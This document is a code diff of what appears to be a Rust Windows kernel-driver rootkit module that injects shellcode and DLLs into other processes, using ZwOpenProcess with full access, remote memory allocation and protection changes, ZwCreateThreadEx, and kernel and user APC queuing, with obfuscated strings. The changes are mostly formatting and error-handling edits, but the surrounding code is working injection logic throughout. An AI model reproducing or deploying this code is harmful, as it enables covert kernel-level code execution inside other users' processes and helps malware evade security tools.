@@ -1,29 +1,23 @@
+use core::{ffi::c_void, mem::transmute, ptr::null_mut};
 use obfstr::obfstr as s;
-use core::{
-    ffi::c_void, 
-    mem::transmute, 
-    ptr::null_mut
-};
 use wdk_sys::{
-    ntddk::*, *,
     _MODE::{KernelMode, UserMode},
+    ntddk::*,
+    *,
 };
 
 use crate::{
-    *, 
-    file::read_file, 
-    error::ShadowError,
-    patterns::{
-        find_zw_function, 
-        LDR_SHELLCODE
-    }, 
+    attach::ProcessAttach, 
+    handle::Handle,
+    pool::PoolMemory,
+    *
 };
 use crate::{
-    attach::ProcessAttach, 
-    handle::Handle, 
-    pool::PoolMemory
+    error::ShadowError,
+    file::read_file,
+    patterns::{LDR_SHELLCODE, find_zw_function},
+    data::KAPC_ENVIROMENT::OriginalApcEnvironment,
 };
-use crate::data::KAPC_ENVIROMENT::OriginalApcEnvironment;
 
 /// Represents shellcode injection operations.
 pub struct Shellcode;
@@ -51,7 +45,13 @@ impl Shellcode {
         let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
-        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
+        let mut status = ZwOpenProcess(
+            &mut h_process,
+            PROCESS_ALL_ACCESS,
+            &mut obj_attr,
+            &mut client_id,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
         }
@@ -65,7 +65,15 @@ impl Shellcode {
         // Allocate memory in the target process for the shellcode
         let mut region_size = shellcode.len() as u64;
         let mut base_address = null_mut();
-        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            h_process.get(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
         }
@@ -84,13 +92,20 @@ impl Shellcode {
 
         // Change the memory protection to allow execution of the shellcode
         let mut old_protect = 0;
-        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
+        status = ZwProtectVirtualMemory(
+            h_process.get(),
+            &mut base_address,
+            &mut region_size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
         }
 
         // Create a thread in the target process to execute the shellcode
-        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
+        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExFn>(zw_thread_addr);
         let mut h_thread = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         status = ZwCreateThreadEx(
@@ -139,7 +154,13 @@ impl Shellcode {
         let mut h_process: HANDLE = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
-        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
+        let mut status = ZwOpenProcess(
+            &mut h_process,
+            PROCESS_ALL_ACCESS,
+            &mut obj_attr,
+            &mut client_id,
+        );
+        
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
         }
@@ -150,7 +171,15 @@ impl Shellcode {
         // Allocate memory in the target process for the shellcode
         let mut base_address = null_mut();
         let mut region_size = shellcode.len() as u64;
-        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            h_process.get(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
         }
@@ -224,12 +253,12 @@ impl Shellcode {
 
         // Insert the user APC into the queue
         if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
-            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
+            return Err(ShadowError::ApiCallFailed("KeInsertQueueApc", -1));
         }
 
         // Insert the kernel APC into the queue
         if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
-            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
+            return Err(ShadowError::ApiCallFailed("KeInsertQueueApc [2]", -1));
         }
 
         Ok(status)
@@ -264,7 +293,15 @@ impl Shellcode {
         // Allocate memory in the target process for the payload
         let mut base_address = null_mut();
         let mut region_size = buffer.len() as u64;
-        status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            -1isize as HANDLE,
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
         }
@@ -275,7 +312,15 @@ impl Shellcode {
         // Allocate memory for the CONTEXT structure in the target process
         let mut context_addr = null_mut();
         let mut context_size = size_of::<CONTEXT>() as u64;
-        status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut context_addr, 0, &mut context_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            -1isize as HANDLE,
+            &mut context_addr,
+            0,
+            &mut context_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory [2]", status));
         }
@@ -341,7 +386,13 @@ impl DLL {
         let target_eprocess = Process::new(pid)?;
         let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
-        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
+        let mut status = ZwOpenProcess(
+            &mut h_process,
+            PROCESS_ALL_ACCESS,
+            &mut obj_attr,
+            &mut client_id,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
         }
@@ -352,7 +403,15 @@ impl DLL {
         // Allocate memory in the target process for the DLL path
         let mut base_address = null_mut();
         let mut region_size = (path.len() * size_of::<u16>()) as u64;
-        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            h_process.get(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
         }
@@ -370,7 +429,7 @@ impl DLL {
         );
 
         // Create a thread in the target process to load the DLL
-        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
+        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExFn>(zw_thread_addr);
         let mut h_thread = null_mut();
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
         status = ZwCreateThreadEx(
@@ -408,7 +467,7 @@ impl DLL {
     ///
     /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
     /// * `Err(ShadowError)` - If any step fails.
-    pub unsafe fn apc(pid: usize, path: &str) -> Result<NTSTATUS> {         
+    pub unsafe fn apc(pid: usize, path: &str) -> Result<NTSTATUS> {
         // Find an alertable thread in the target process
         let tid = find_thread_alertable(pid)?;
 
@@ -420,7 +479,13 @@ impl DLL {
         let target_eprocess = Process::new(pid)?;
         let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
         let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
-        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
+        let mut status = ZwOpenProcess(
+            &mut h_process,
+            PROCESS_ALL_ACCESS,
+            &mut obj_attr,
+            &mut client_id,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
         }
@@ -431,7 +496,15 @@ impl DLL {
         // Allocate memory in the target process for the DLL path
         let mut base_address = null_mut();
         let mut region_size = (path.len() * size_of::<u16>()) as u64;
-        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            h_process.get(),
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
         }
@@ -451,7 +524,15 @@ impl DLL {
         // Allocate memory for shellcode
         let mut shellcode_address = null_mut();
         let mut shellcode_size = LDR_SHELLCODE.len() as u64;
-        status = ZwAllocateVirtualMemory(h_process.get(), &mut shellcode_address, 0, &mut shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        status = ZwAllocateVirtualMemory(
+            h_process.get(),
+            &mut shellcode_address,
+            0,
+            &mut shellcode_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
         if !NT_SUCCESS(status) {
             return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory [2]", status));
         }
@@ -512,12 +593,12 @@ impl DLL {
 
         // Insert the user APC into the queue
         if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
-            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
+            return Err(ShadowError::ApiCallFailed("KeInsertQueueApc", -1));
         }
 
         // Insert the kernel APC into the queue
         if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
-            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
+            return Err(ShadowError::ApiCallFailed("KeInsertQueueApc [2]", -1));
         }
 
         Ok(STATUS_SUCCESS)
@@ -528,8 +609,7 @@ impl DLL {
 ///
 /// This callback is triggered when the kernel APC is executed.
 /// It ensures that the thread is alertable and then frees the allocated APC structure.
-unsafe extern "system" 
-fn kernel_apc_callback(
+unsafe extern "system" fn kernel_apc_callback(
     apc: PKAPC,
     _normal_routine: *mut PKNORMAL_ROUTINE,
     _normal_context: *mut PVOID,
@@ -547,8 +627,7 @@ fn kernel_apc_callback(
 ///
 /// This callback is triggered when the user APC is executed.
 /// It checks if the thread is terminating and frees the APC structure when done.
-unsafe extern "system" 
-fn user_apc_callback(
+unsafe extern "system" fn user_apc_callback(
     apc: PKAPC,
     normal_routine: *mut PKNORMAL_ROUTINE,
     _normal_context: *mut PVOID,
